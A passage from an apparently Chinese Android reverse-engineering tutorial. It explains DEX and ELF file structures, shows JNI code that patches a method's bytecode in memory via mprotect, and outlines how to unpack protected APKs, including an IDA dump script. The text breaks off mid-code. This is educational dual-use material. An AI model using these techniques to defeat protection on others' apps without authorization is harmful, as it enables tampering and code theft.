style="text-align:center">连接数据区</td></tr></tbody></table><p>这里先看一下 Android 源码，首先在 <a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Common.h" target="_blank" rel="noopener">/dalvik/vm/Common.h</a> 中对数据类型有一个重命名：</p><pre><code class="cpp">/* * These match the definitions in the VM specification. */typedef uint8_t             u1;typedef uint16_t            u2;typedef uint32_t            u4;typedef uint64_t            u8;typedef int8_t              s1;typedef int16_t             s2;typedef int32_t             s4;typedef int64_t             s8;</code></pre><p>所有 dex 文件相关的数据结构都在 <a href="http://androidxref.com/4.1.1/xref/dalvik/libdex/DexFile.h" target="_blank" rel="noopener">/dalvik/libdex/DexFile.h</a> 中。dex 文件的结构如下：</p><pre><code class="cpp">/* * Structure representing a DEX file. * * Code should regard DexFile as opaque, using the API calls provided here * to access specific structures. */struct DexFile {    /* directly-mapped &quot;opt&quot; header */    const DexOptHeader* pOptHeader;    /* pointers to directly-mapped structs and arrays in base DEX */    const DexHeader*    pHeader;    const DexStringId*  pStringIds;    const DexTypeId*    pTypeIds;    const DexFieldId*   pFieldIds;    const DexMethodId*  pMethodIds;    const DexProtoId*   pProtoIds;    const DexClassDef*  pClassDefs;    const DexLink*      pLinkData;    /*     * These are mapped out of the &quot;auxillary&quot; section, and may not be     * included in the file.     */    const DexClassLookup* pClassLookup;    const void*         pRegisterMapPool;       // RegisterMapClassPool    /* points to start of DEX file data */    const u1*           baseAddr;    /* track memory overhead for auxillary structures */    int                 overhead;    /* additional app-specific data structures associated with the DEX */    //void*               auxData;};</code></pre><p>dex 文件结构分别为文件头、索引区和数据区：</p><p><img src="/pics/Android逆向入门/四/2.png" srcset="/img/loading.gif" alt></p><h2 id="dex-文件头"><a href="#dex-文件头" class="headerlink" title="dex 文件头"></a>dex 文件头</h2><p>文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性：</p><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">偏移值</th><th style="text-align:center">长度</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">magic</td><td style="text-align:center">0x00</td><td style="text-align:center">8</td><td style="text-align:center">魔数字段，值为”dex\n035\0”</td></tr><tr><td style="text-align:center">checksum</td><td style="text-align:center">0x08</td><td style="text-align:center">4</td><td style="text-align:center">校验码</td></tr><tr><td style="text-align:center">signature</td><td style="text-align:center">0x0c</td><td style="text-align:center">20</td><td style="text-align:center">sha-1 签名</td></tr><tr><td style="text-align:center">file_size</td><td style="text-align:center">0x20</td><td style="text-align:center">4</td><td style="text-align:center">dex 文件总长度</td></tr><tr><td style="text-align:center">header_size</td><td style="text-align:center">0x24</td><td style="text-align:center">4</td><td style="text-align:center">文件头长度，009 版本=0x5c,035 版本=0x70</td></tr><tr><td style="text-align:center">endian_tag</td><td style="text-align:center">0x28</td><td style="text-align:center">4</td><td style="text-align:center">标示字节顺序的常量</td></tr><tr><td style="text-align:center">link_size</td><td style="text-align:center">0x2c</td><td style="text-align:center">4</td><td style="text-align:center">链接段的大小，如果为 0 就是静态链接</td></tr><tr><td style="text-align:center">link_off</td><td style="text-align:center">0x30</td><td style="text-align:center">4</td><td style="text-align:center">链接段的开始位置</td></tr><tr><td style="text-align:center">map_off</td><td style="text-align:center">0x34</td><td style="text-align:center">4</td><td style="text-align:center">map 数据基址</td></tr><tr><td style="text-align:center">string_ids_size</td><td style="text-align:center">0x38</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表中字符串个数</td></tr><tr><td style="text-align:center">string_ids_off</td><td style="text-align:center">0x3c</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表基址</td></tr><tr><td style="text-align:center">type_ids_size</td><td style="text-align:center">0x40</td><td style="text-align:center">4</td><td style="text-align:center">类列表里的类型个数</td></tr><tr><td style="text-align:center">type_ids_off</td><td style="text-align:center">0x44</td><td style="text-align:center">4</td><td style="text-align:center">类列表基址</td></tr><tr><td style="text-align:center">proto_ids_size</td><td style="text-align:center">0x48</td><td style="text-align:center">4</td><td style="text-align:center">原型列表里面的原型个数</td></tr><tr><td style="text-align:center">proto_ids_off</td><td style="text-align:center">0x4c</td><td style="text-align:center">4</td><td style="text-align:center">原型列表基址</td></tr><tr><td style="text-align:center">field_ids_size</td><td style="text-align:center">0x50</td><td style="text-align:center">4</td><td style="text-align:center">字段个数</td></tr><tr><td style="text-align:center">field_ids_off</td><td style="text-align:center">0x54</td><td style="text-align:center">4</td><td style="text-align:center">字段列表基址</td></tr><tr><td style="text-align:center">method_ids_size</td><td style="text-align:center">0x58</td><td style="text-align:center">4</td><td style="text-align:center">方法个数</td></tr><tr><td style="text-align:center">method_ids_off</td><td style="text-align:center">0x5c</td><td style="text-align:center">4</td><td style="text-align:center">方法列表基址</td></tr><tr><td style="text-align:center">class_defs_size</td><td style="text-align:center">0x60</td><td style="text-align:center">4</td><td style="text-align:center">类定义标中类的个数</td></tr><tr><td style="text-align:center">class_defs_off</td><td style="text-align:center">0x64</td><td style="text-align:center">4</td><td style="text-align:center">类定义列表基址</td></tr><tr><td style="text-align:center">data_size</td><td style="text-align:center">0x68</td><td style="text-align:center">4</td><td style="text-align:center">数据段的大小，必须 4k 对齐</td></tr><tr><td style="text-align:center">data_off</td><td style="text-align:center">0x6c</td><td style="text-align:center">4</td><td style="text-align:center">数据段基址</td></tr></tbody></table><p>文件头的数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;header_item&quot; struct. */struct DexHeader {    u1  magic[8];           /* includes version number */    u4  checksum;           /* adler32 checksum */    u1  signature[kSHA1DigestLen]; /* SHA-1 hash */    u4  fileSize;           /* length of entire file */    u4  headerSize;         /* offset to start of next section */    u4  endianTag;    u4  linkSize;    u4  linkOff;    u4  mapOff;    u4  stringIdsSize;    u4  stringIdsOff;    u4  typeIdsSize;    u4  typeIdsOff;    u4  protoIdsSize;    u4  protoIdsOff;    u4  fieldIdsSize;    u4  fieldIdsOff;    u4  methodIdsSize;    u4  methodIdsOff;    u4  classDefsSize;    u4  classDefsOff;    u4  dataSize;    u4  dataOff;};</code></pre><h2 id="索引区"><a href="#索引区" class="headerlink" title="索引区"></a>索引区</h2><p>索引区包括 string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;string_id_item&quot;. */struct DexStringId {    u4 stringDataOff;      /* file offset to string_data_item */};/* * Direct-mapped &quot;type_id_item&quot;. */struct DexTypeId {    u4  descriptorIdx;      /* index into stringIds list for type descriptor */};/* * Direct-mapped &quot;field_id_item&quot;. */struct DexFieldId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  typeIdx;            /* index into typeIds for field type */    u4  nameIdx;            /* index into stringIds for field name */};/* * Direct-mapped &quot;method_id_item&quot;. */struct DexMethodId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  protoIdx;           /* index into protoIds for method prototype */    u4  nameIdx;            /* index into stringIds for method name */};/* * Direct-mapped &quot;proto_id_item&quot;. */struct DexProtoId {    u4  shortyIdx;          /* index into stringIds for shorty descriptor */    u4  returnTypeIdx;      /* index into typeIds list for return type */    u4  parametersOff;      /* file offset to type_list for parameter types */};</code></pre><h2 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h2><p>数据段包括 class_defs、data、link_data，数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;map_item&quot;. */struct DexMapItem {    u2 type;              /* type code (see kDexType* above) */    u2 unused;    u4 size;              /* count of items of the indicated type */    u4 offset;            /* file offset to the start of data */};/* * Direct-mapped &quot;map_list&quot;. */struct DexMapList {    u4  size;               /* #of entries in list */    DexMapItem list[1];     /* entries */};/* * Direct-mapped &quot;class_def_item&quot;. */struct DexClassDef {    u4  classIdx;           /* index into typeIds for this class */    u4  accessFlags;    u4  superclassIdx;      /* index into typeIds for superclass */    u4  interfacesOff;      /* file offset to DexTypeList */    u4  sourceFileIdx;      /* index into stringIds for source file name */    u4  annotationsOff;     /* file offset to annotations_directory_item */    u4  classDataOff;       /* file offset to class_data_item */    u4  staticValuesOff;    /* file offset to DexEncodedArray */};/* * Link table.  Currently undefined. */struct DexLink {    u1  bleargh;};</code></pre><h1 id="动态代码自修改（加壳原理）"><a href="#动态代码自修改（加壳原理）" class="headerlink" title="动态代码自修改（加壳原理）"></a>动态代码自修改（加壳原理）</h1><p>DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns</p><pre><code class="cpp">/* * Direct-mapped &quot;code_item&quot;. * * The &quot;catches&quot; table is used when throwing an exception, * &quot;debugInfo&quot; is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode {    u2  registersSize;      // 使用的寄存器个数    u2  insSize;            // 参数个数    u2  outsSize;           // 调用其他方法时使用的寄存器个数    u2  triesSize;          // Try/Catch的个数    u4  debugInfoOff;       // 指令调试信息的偏移 /* file offset to debug info stream */    u4  insnsSize;          // 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */    u2  insns[1];           // 指令集    /* followed by optional u2 padding */    /* followed by try_item[triesSize] */    /* followed by uleb128 handlersSize */    /* followed by catch_handler_item[handlersSize] */};</code></pre><p>其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。</p><h2 id="修改-insns"><a href="#修改-insns" class="headerlink" title="修改 insns"></a>修改 insns</h2><h3 id="直接在内存中修改"><a href="#直接在内存中修改" class="headerlink" title="直接在内存中修改"></a>直接在内存中修改</h3><ol><li>定位到 dex 文件</li><li>计算函数的 DexCode 位置</li><li>重写 DexCode 的 insns 数据</li></ol><h4 id="JNI-Bridge"><a href="#JNI-Bridge" class="headerlink" title="JNI Bridge"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Jni.cpp" target="_blank" rel="noopener">JNI Bridge</a></h4><p>JNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。</p><h4 id="Object-结构体"><a href="#Object-结构体" class="headerlink" title="Object 结构体"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/oo/Object.cpp" target="_blank" rel="noopener">Object 结构体</a></h4><p>Android 运行时，解析 dex 文件，并生成相关的结构体：<a href="http://androidxref.com/4.1.1/xref/dalvik/vm/DvmDex.cpp" target="_blank" rel="noopener">DvmDex</a>。其中存储了各种字符串、类、方法等信息。加载的时候，调用 <code>dvmDexFileOpenPartial</code> 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。</p><p>其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>首先新建一个 JNI 项目，并新建两个函数 <code>ret1()</code> 和 <code>ret2()</code> 函数，以及一个 Native 函数 <code>changeMethod()</code>：</p><pre><code class="java">package com.assassinq.editdexfile;import android.os.Bundle;import com.google.android.material.floatingactionbutton.FloatingActionButton;import androidx.appcompat.app.AppCompatActivity;import androidx.appcompat.widget.Toolbar;import android.util.Log;import android.view.View;import android.view.Menu;import android.view.MenuItem;import java.lang.reflect.Method;public class MainActivity extends AppCompatActivity {    static {        System.loadLibrary(&quot;hello&quot;);    }    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Toolbar toolbar = findViewById(R.id.toolbar);        setSupportActionBar(toolbar);        FloatingActionButton fab = findViewById(R.id.fab);        fab.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                try {                    Method m = MainActivity.class.getMethod(&quot;ret1&quot;);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                    changeMethod(m);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                } catch (Exception e) {//                    e.printStackTrace();                    Log.d(&quot;EXCEPTION&quot;, Log.getStackTraceString(e));                }            }        });    }    @Override    public boolean onCreateOptionsMenu(Menu menu) {        // Inflate the menu; this adds items to the action bar if it is present.        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }    @Override    public boolean onOptionsItemSelected(MenuItem item) {        // Handle action bar item clicks here. The action bar will        // automatically handle clicks on the Home/Up button, so long        // as you specify a parent activity in AndroidManifest.xml.        int id = item.getItemId();        //noinspection SimplifiableIfStatement        if (id == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }    public int ret1() {        return 1;    }    public int ret2() {        return 2;    }    // public native void changeMethod(Method r1);}</code></pre><p>先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 <code>ret1()</code> 和 <code>ret2()</code> 的字节码：</p><p><img src="/pics/Android逆向入门/四/3.png" srcset="/img/loading.gif" alt></p><p>然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 <code>ret1()</code> 所指向的字节码修改为 <code>ret2()</code> 的字节码：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;android/log.h&gt;#include &quot;Object.h&quot;#include &quot;Common.h&quot;#ifdef LOG_TAG#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endifconst char insns[] = {0x12, 0x20, 0x0F, 0x00};void changeMethod(JNIEnv *env, jobject obj, jobject method) {    /*     * 12 10 0F 00 -&gt; ret 1     * 12 20 0F 00 -&gt; ret 2     */    Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method);    pMethod-&gt;insns = (const u2*) insns;}static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods,                                 int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}static const char *gClassName = &quot;com/assassinq/editdexfile/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;changeMethod&quot;, &quot;(Ljava/lang/reflect/Method;)V&quot;, (void *) changeMethod},};JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) ==        JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><p>运行程序并点击触发事件，查看日志发现修改生效：</p><pre><code class="log">02-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 102-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2</code></pre><h3 id="IDA-中动态修改"><a href="#IDA-中动态修改" class="headerlink" title="IDA 中动态修改"></a>IDA 中动态修改</h3><ol><li>Ctrl+s 打开 map 数据</li><li>查找内存加载的额 classes.dex 的位置</li><li>直接计算偏移，修改相应的位置</li></ol><h3 id="内存修改的另一种方法"><a href="#内存修改的另一种方法" class="headerlink" title="内存修改的另一种方法"></a>内存修改的另一种方法</h3><p>修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 数据。</p><p>遍历 Map：</p><pre><code class="cpp">void *get_module_base(pid_t pid, const char *module_name) {    FILE *fp;    long addr = 0;    char *pch;    char filename[32];    char line[1024];    if (pid &lt; 0) {        snprintf(filename, sizeof(filename), &quot;/proc/self/maps&quot;);    } else {        snprintf(filename, sizeof(filename), &quot;/proc/%d/maps&quot;, pid);    }    fp = fopen(filename, &quot;r&quot;);    if (fp != NULL) {        while (fgets(line, sizeof(line), fp)) {            LOGD(&quot;%s&quot;, line);            if (strstr(line, module_name)) {                pch = strtok(line, &quot;-&quot;);                addr = strtoul(pch, NULL, 16);                break;            }        }        fclose(fp);    }    return (void *) addr;}</code></pre><p>重置 Map 属性：</p><pre><code class="cpp">#include &lt;asm-generic/mman-common.h&gt;#include &lt;sys/mman.h&gt;#include &lt;limits.h&gt;if (mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {    *(u4 *)(pCode-&gt;insns) = 0x000f2012;    mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);}</code></pre><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数：</p><pre><code class="cpp">void changeMethod2(JNIEnv *env, jobject obj) {    u1 *pDex = (u1 *) get_module_base(-1, &quot;/data/dalvik-cache/data@app@com.assassinq.editdexfile&quot;);    if (pDex != NULL) {        LOGD(&quot;Get Module&quot;);        pDex += sizeof(DexOptHeader);        DexFile *pDexFile = dexFileParse(pDex, sizeof(DexHeader), kDexParseContinueOnError);        if (pDexFile == NULL) {            LOGE(&quot;Unable to parse DexFile&quot;);            return;        }        const DexClassDef *pClassDef;        for (int i = 0; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) {            const DexClassDef *pDef = dexGetClassDef(pDexFile, i);            if (!strcmp(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx),                        &quot;Lcom/assassinq/editdexfile/MainActivity;&quot;)) {                pClassDef = pDef;                break;            }        }        if (pClassDef != NULL) {            LOGD(&quot;Class Found&quot;);            const u1 *pData = dexGetClassData(pDexFile, pClassDef);            if (pData) {                DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, NULL);                for (int i = 0; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) {                    DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i];                    const DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx);                    if (!strcmp(dexStringById(pDexFile, pMethodId-&gt;nameIdx), &quot;ret1&quot;)) {                        const DexCode *pCode = dexGetCode(pDexFile, pMethod);                        LOGD(&quot;Method found and try to patch&quot;);                        if (mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ | PROT_WRITE) == 0) {                            *(u4 *) (pCode-&gt;insns) = 0x000F2012;                            mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ);                        }                    }                }                free(pClassData);            }        }        dexFileFree(pDexFile);    }}static JNINativeMethod gMethods[] = {        ...        {&quot;changeMethod2&quot;, &quot;()V&quot;,                           (void *) changeMethod2},};...</code></pre><p>在 app 下的 build.gradle 中修改以强制转换指针：</p><pre><code>android {    ...    defaultConfig {        ...        externalNativeBuild {            cmake {                cppFlags &quot;-fpermissive&quot;            }        }    }    ...}</code></pre><p>TODO</p><h1 id="DVM-脱壳"><a href="#DVM-脱壳" class="headerlink" title="DVM 脱壳"></a>DVM 脱壳</h1><p>目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。</p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>壳入口：</p><pre><code class="xml">&lt;application android:name=&quot;com.ali.mobisecenhance.SubApplication&quot; /&gt;</code></pre><p>程序入口：</p><pre><code class="xml">&lt;activity android:name=&quot;com.ali.encryption.MainActivity&quot; /&gt;</code></pre><h2 id="assets-分析"><a href="#assets-分析" class="headerlink" title="assets 分析"></a>assets 分析</h2><p>assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。</p><h2 id="ProxyApplication-分析"><a href="#ProxyApplication-分析" class="headerlink" title="ProxyApplication 分析"></a>ProxyApplication 分析</h2><h2 id="壳代码分析"><a href="#壳代码分析" class="headerlink" title="壳代码分析"></a>壳代码分析</h2><p>壳代码中 Java 层转 Native 层：</p><pre><code class="java">protected native void attachBaseContext(Context arg1) {} // 还原代码public native void onCreate() {} // 执行原始代码</code></pre><h2 id="so-文件分析"><a href="#so-文件分析" class="headerlink" title="so 文件分析"></a>so 文件分析</h2><p>带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。</p><h2 id="IDA-中-dump-数据"><a href="#IDA-中-dump-数据" class="headerlink" title="IDA 中 dump 数据"></a>IDA 中 dump 数据</h2><p>在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    begin = 0x544D2008; // 解密后数据在内存中的位置    len = 0x019CF4; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><h2 id="Dex-加载流程"><a href="#Dex-加载流程" class="headerlink" title="Dex 加载流程"></a>Dex 加载流程</h2><p>vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。</p><pre><code class="cpp">// 转换存储的dex格式为可执行的dex格式dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);// 添加到gDvm中addToDexFileTable(pDexOrJar);</code></pre><p>壳实现加载流程：</p><ol><li>内存中解密 dex 函数</li><li>将 dex 存储结构转换为可执行结构</li><li>添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数）</li><li>抹去 dex 存储结构中的有效数据</li></ol><h2 id="内存-dex-定位"><a href="#内存-dex-定位" class="headerlink" title="内存 dex 定位"></a>内存 dex 定位</h2><p>gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。</p><p>Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。</p><p>Dex 转 Odex：优化 vm\analysis\Optimize.cpp-&gt;dvmOptimizeClass</p><p>Dex 校验：vm\analysis\DexVerify.cpp-&gt;dvmVerifyClass</p><p>取消非必要优化与校验：\system\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n</p><h1 id="ELF-文件简介（ARM-架构下的-ELF）"><a href="#ELF-文件简介（ARM-架构下的-ELF）" class="headerlink" title="ELF 文件简介（ARM 架构下的 ELF）"></a>ELF 文件简介（ARM 架构下的 ELF）</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。</p><p><img src="/pics/Android逆向入门/四/4.png" srcset="/img/loading.gif" alt></p><p>链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。</p><p>PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。</p><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。</p><pre><code class="bash">$ readelf -h libxtian.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          117240 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         25  Section header string table index: 24</code></pre><h3 id="Section-Header"><a href="#Section-Header" class="headerlink" title="Section Header"></a>Section Header</h3><p>存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。</p><pre><code class="bash">$ readelf -S libxtian.soThere are 25 section headers, starting at offset 0x1c9f8:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.gnu.build-i NOTE            00000134 000134 000024 00   A  0   0  4  [ 2] .dynsym           DYNSYM          00000158 000158 000570 10   A  3   1  4  [ 3] .dynstr           STRTAB          000006c8 0006c8 00034e 00   A  0   0  1  [ 4] .hash             HASH            00000a18 000a18 000270 04   A  2   0  4  [ 5] .gnu.version      VERSYM          00000c88 000c88 0000ae 02   A  2   0  2  [ 6] .gnu.version_d    VERDEF          00000d38 000d38 00001c 00   A  3   1  4  [ 7] .gnu.version_r    VERNEED         00000d54 000d54 000020 00   A  3   1  4  [ 8] .rel.dyn          REL             00000d74 000d74 0050f8 08   A  2   0  4  [ 9] .rel.plt          REL             00005e6c 005e6c 0000a0 08  AI  2  10  4  [10] .plt              PROGBITS        00005f0c 005f0c 000104 00  AX  0   0  4  [11] .text             PROGBITS        00006010 006010 013684 00  AX  0   0  4  [12] .ARM.extab        PROGBITS        00019694 019694 0001a4 00   A  0   0  4  [13] .ARM.exidx        ARM_EXIDX       00019838 019838 000250 08  AL 11   0  4  [14] .rodata           PROGBITS        00019a90 019a90 0002d0 00   A  0   0 16  [15] .fini_array       FINI_ARRAY      0001ad64 019d64 000008 00  WA  0   0  4  [16] .init_array       INIT_ARRAY      0001ad6c 019d6c 000004 00  WA  0   0  1  [17] .dynamic          DYNAMIC         0001ad70 019d70 000120 08  WA  3   0  4  [18] .got              PROGBITS        0001ae90 019e90 000170 00  WA  0   0  4  [19] .data             PROGBITS        0001b000 01a000 002870 00  WA  0   0 16  [20] .bss              NOBITS          0001d870 01c870 0001d8 00  WA  0   0  4  [21] .comment          PROGBITS        00000000 01c870 00003d 01  MS  0   0  1  [22] .note.gnu.gold-ve NOTE            00000000 01c8b0 00001c 00      0   0  4  [23] .ARM.attributes   ARM_ATTRIBUTES  00000000 01c8cc 000036 00      0   0  1  [24] .shstrtab         STRTAB          00000000 01c902 0000f6 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><h3 id="Program-Header"><a href="#Program-Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的</p><pre><code class="bash">$ readelf -l libxtian.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000  LOAD           0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW  0x1000  DYNAMIC        0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x00024 0x00024 R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0  EXIDX          0x019838 0x00019838 0x00019838 0x00250 0x00250 R   0x4  GNU_RELRO      0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata   02     .fini_array .init_array .dynamic .got .data .bss   03     .dynamic   04     .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .init_array .dynamic .got</code></pre><h2 id="加载-so-的流程"><a href="#加载-so-的流程" class="headerlink" title="加载 so 的流程"></a>加载 so 的流程</h2><p>Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。</p><p>Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析：</p><pre><code class="cpp">link.cpp -&gt; soinfo *do_dlopen(const char *name, int 